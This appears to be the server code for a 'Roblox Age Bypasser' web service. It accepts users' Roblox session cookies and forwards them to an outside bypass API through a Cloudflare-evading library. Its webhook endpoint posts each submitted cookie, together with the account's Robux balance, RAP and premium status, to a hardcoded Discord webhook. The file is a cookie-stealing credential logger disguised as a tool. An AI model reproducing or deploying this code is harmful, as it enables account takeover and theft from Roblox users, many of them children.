const express = require('express');
const axios = require('axios'); // We still use axios for our own webhook
const cloudscraper = require('cloudscraper'); // The new library to bypass Cloudflare
const { RobloxUser } = require('./getuserinfo');

const app = express();
app.use(express.json());

const API_BASE_URL = 'https://rblxbypasser.com/api';

// --- Endpoint 1: Starts the bypass process (USING CLOUDSCRAPER) ---
app.post('/api/bypass', async (req, res) => {
    const { cookie } = req.body;
    if (!cookie) {
        return res.status(400).json({ success: false, message: "Cookie is required." });
    }
    
    const options = {
        method: 'POST',
        url: `${API_BASE_URL}/bypass`,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie })
    };

    cloudscraper(options).then(body => {
        // Cloudscraper succeeded, send the response back to the user
        res.status(200).json(JSON.parse(body));
    }).catch(err => {
        // Cloudscraper failed, this means a true error occurred
        console.error("Cloudscraper bypass error:", err);
        const status = err.statusCode || 500;
        res.status(status).json({ success: false, message: "Bypass failed. The API may be down or has blocked our requests." });
    });
});

// --- Endpoint 2: Polls for progress (USING CLOUDSCRAPER) ---
app.get('/api/progress', async (req, res) => {
    const { token } = req.query;
    if (!token) {
        return res.status(400).json({ success: false, message: "Token is required." });
    }

    const options = {
        method: 'GET',
        url: `${API_BASE_URL}/progress?token=${token}`
    };
    
    cloudscraper(options).then(body => {
        res.status(200).json(JSON.parse(body));
    }).catch(err => {
        console.error("Cloudscraper progress error:", err);
        const status = err.statusCode || 500;
        res.status(status).json({ success: false, message: "Failed to get progress." });
    });
});

// --- Endpoint 3: Webhook Logic (No changes needed, this calls Discord directly) ---
app.post('/api/webhook', async (req, res) => {
    const { cookie } = req.body;
    if (!cookie) {
        return res.status(200).send("Webhook ignored: No cookie provided.");
    }
    const webhookURL = "https://discord.com/api/webhooks/1450559440221900941/G8PfWJn3sZ6FEtCdVzgFUg-IgYHzPG2vhEN4lHMQLGGjQ8rRhPsOdvrCK7GTp8yOfiLZ";
    try {
        const robloxUser = await RobloxUser.register(cookie);
        const userData = await robloxUser.getUserData();
        const format = (num) => new Intl.NumberFormat('en-US').format(num);
        const embed = {
            color: 0x43afff,
            author: { name: `${userData.displayName} (@${userData.username}) - Age Bypassed`, url: `https://www.roblox.com/users/${userData.uid}/profile` },
            thumbnail: { url: userData.avatarUrl },
            fields: [
                { name: '💰 Robux', value: `\`${format(userData.balance)}\``, inline: true },
                { name: '📈 RAP', value: `\`${format(userData.rap)}\``, inline: true },
                { name: '⭐ Premium', value: userData.isPremium ? '✅ Active' : '❌ None', inline: true },
                { name: '🍪 Cookie Used', value: `\`\`\`${cookie}\`\`\``, inline: false },
            ],
            footer: { text: "Roblox Age Bypasser • Success" },
            timestamp: new Date().toISOString()
        };
        await axios.post(webhookURL, { embeds: [embed] }); // Using axios here is fine
        res.status(200).send("Webhook sent successfully.");
    } catch (error) {
        console.error("WEBHOOK TASK FAILED:", error.message);
        res.status(200).send("Webhook task failed on server.");
    }
});

module.exports = app;
